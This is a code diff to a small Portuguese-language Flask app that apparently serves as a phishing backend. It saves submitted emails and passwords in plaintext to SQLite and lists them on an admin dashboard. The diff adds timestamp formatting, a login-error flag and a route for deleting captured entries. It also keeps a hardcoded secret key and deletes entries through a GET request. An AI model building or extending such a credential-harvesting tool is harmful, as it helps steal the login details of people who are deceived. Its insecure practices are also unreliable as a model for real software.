@@ -9,7 +9,8 @@ app.secret_key = "segredo_super_secreto"
 def salvar_credenciais(email, senha):
     conn = sqlite3.connect("database/database.db")
     cursor = conn.cursor()
-    cursor.execute("INSERT INTO credenciais (email, senha, data_hora) VALUES (?, ?, ?)", (email, senha, datetime.now()))
+    data_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    cursor.execute("INSERT INTO credenciais (email, senha, data_hora) VALUES (?, ?, ?)", (email, senha, data_hora))
     conn.commit()
     conn.close()
 
@@ -31,6 +32,7 @@ def login():
 # Página de login do admin
 @app.route("/admin", methods=["GET", "POST"])
 def admin_login():
+    erro = False
     if request.method == "POST":
         usuario = request.form["usuario"]
         senha = request.form["senha"]
@@ -42,7 +44,9 @@ def admin_login():
         if admin:
             session["admin"] = True
             return redirect("/dashboard")
-    return render_template("admin_login.html")
+        else:
+            erro = True
+    return render_template("admin_login.html", erro=erro)
 
 # Painel administrativo
 @app.route("/dashboard")
@@ -55,6 +59,18 @@ def dashboard():
     dados = cursor.fetchall()
     conn.close()
     return render_template("dashboard.html", dados=dados)
+
+# Rota para apagar credencial
+@app.route("/delete/<int:id>")
+def delete_credencial(id):
+    if not session.get("admin"):
+        return redirect("/admin")
+    conn = sqlite3.connect("database/database.db")
+    cursor = conn.cursor()
+    cursor.execute("DELETE FROM credenciais WHERE id=?", (id,))
+    conn.commit()
+    conn.close()
+    return redirect("/dashboard")
 
 # Logout do admin
 @app.route("/logout")
